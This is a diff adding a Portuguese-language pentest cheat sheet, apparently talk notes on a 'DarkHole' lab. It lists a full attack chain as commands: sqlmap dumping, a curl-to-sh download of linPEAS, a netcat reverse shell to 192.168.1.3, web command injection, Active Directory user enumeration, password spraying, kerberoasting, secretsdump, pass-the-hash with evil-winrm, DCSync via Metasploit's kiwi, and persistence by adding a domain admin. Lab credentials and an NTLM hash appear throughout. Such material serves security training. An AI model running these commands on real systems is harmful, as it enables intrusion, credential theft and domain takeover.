@@ -1,0 +1,108 @@
+--> Coleta de Informações e Reconhecimento:
+
+Enumeração:
+nmap -A www.darkhole.com
+
+Git Exposed:
+python3 git_dumper.py http://darkhole.com/.git/ backup
+git log
+git diff a4d900a8d85e8938d3601f3cef113ee293028e10
+
+
+--> Exploração e Infiltração:
+
+SQLi:
+sqlmap -r sql --dbs --batch
+sqlmap -r sql -D darkhole_2 --dump-all --batch
+
+Acesso SSH:
+ssh jehad@192.168.1.179
+
+--> Escalação de privilégios:
+
+linPEAS:
+curl https://raw.githubusercontent.com/carlospalop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
+
+Port Fowarding:
+ssh jehad@192.168.1.179 -L 9999:localhost:9999
+http://127.0.0.1:9999/?cmd=id
+
+Reverse Shell:
+rm /tmpf;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.3:8888 >/tmp/f
+nc -lvp 8888
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+--> Movimentação Lateral:
+
+Ping sweep:
+for ip in {1..254}; do ping -c 1 192.168.28.$ip >/dev/null && echo "Host 192.168.28.$ip is up"; done
+crackmapexec smb 192.168.28.0/24
+arp-scan -l
+nmap -T1 -v -sn 192.168.28.0/24
+
+Encontrando o IP do AD:
+nmcli dev show eth0
+nltest /dsgetdc:darkhole.local
+
+Criar wordlist com matrículas de usuários:
+for matricula in {250..499}; do echo D159$matricula; done > possible_users.txt
+
+Enumerando usuários do AD:
+kerbrute userenum -d darkhole.local --dc 192.168.28.130 possible_users.txt > user_kerbrute.txt
+cat user_kerbrute.txt | grep "D" | cut -d "@" -f1 | cut -d ":" -f4 | grep -v 'krb' | sed 's/ //g' | tr -s '\n' > filtered-kerbrute.txt
+nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='darkhole.local',userdb=possible_users.txt 192.168.28.130 > nmap-users.txt
+cat nmap-users.txt | grep "@" | cut -d "@" -f1 | cut -d "|" -f2 | sed 's/_//' | sed 's/ //g' > filtered-nmap.txt
+
+Password Spraying:
+crackmapexec smb 192.168.28.0/24 -u filtered-nmap.txt -p Darkhole@2023 DarkHole@2023 | grep "+"
+kerbrute passwordspray -d darkhole.local --dc 192.168.28.130 filtered-nmap.txt Darkhole@2023
+
+Dumping AD:
+ldapdomaindump -u darkhole.local\\D159289 -p Darkhole@2023 -m 192.168.28.130
+bloodhound-python -u D159289 -p Darkhole@2023 -ns 192.168.28.130 -d darkhole.local -c all
+
+Kerberoasting:
+impacket-GetUserSPNs -dc-ip 192.168.28.130 'darkhole.local/D159425:DarkHole@2023' -request
+hashcat -m 13100 --force kerberoasting.txt passwords.txt
+crackmapexec smb 192.168.28.130 -u SVC_SIEM -p 'M1ndTh3sec!2023' --shares
+
+Secretsdump:
+impacket-secretsdump SVC_SIEM@WIN-07GD1L4IOMR.pentest.local -target-ip 192.168.28.130
+
+Acesso remoto:
+evil-winrm -i 192.168.28.130 -u Administrator -H 22c9a701524580b68a63c0aabc2556f9
+
+Dcsync:
+via Metasploit:
+use windows/smb/psexec
+set smbuser SVC_SIEM
+set smbpass M1ndTh3sec!2023
+run
+load kiwi
+kiwi_cmd '"lsadump::dcsync /user:krbtgt"'
+
+--> Manutenção de Acesso:
+
+Criação de um usuário:
+Metasploit:
+use post/windows/manage/add_user
+set username D159999
+set session 1
+set group administrators
+set password PalestraMTS2023!
+run
+Validar via crackmapexec:
+crackmapexec smb 192.168.28130 -u D159999 -p 'PalestraMTS2023!' --shares
+
+AdminSDHolder - Abusing Permission:
+Adicionar um usuário no grupo domain admin:
+net user /domain D159999
+powershell -ep bypass
+Import-module .\powerview.ps1
+Add-DomainGroupMember -Identity 'domain admins' -Members D159999 -Verbose
+net user /domain D159999
+
+Alterar a senha de um usuário:
+Set-DomainUserPassword -Identity D159999 -AccountPassword (ConvertTo-SecureString "Password123" -AsPlainText -Force) -verbose
+crackmapexec smb 192.168.28130 -u D159999 -p 'PalestraMTS2023!' --shares
